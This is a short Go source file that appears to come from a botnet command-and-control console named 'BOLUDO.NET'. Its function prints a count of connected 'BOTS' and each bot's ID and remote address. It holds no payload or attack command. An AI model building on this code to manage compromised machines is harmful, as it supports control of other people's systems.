package nets

import (
	"fmt"

	"BOLUDO.NET/config"
	"BOLUDO.NET/util"
)

func Listar() {
	util.LimpiarConsola()
	fmt.Println(" --- BOTS [", len(config.BOT), "] ---")
	for i := 0; i < len(config.BOT); i++ {
		fmt.Println("BOT [ID: ", i, "] : ", config.BOT[i].RemoteAddr())
	}
}
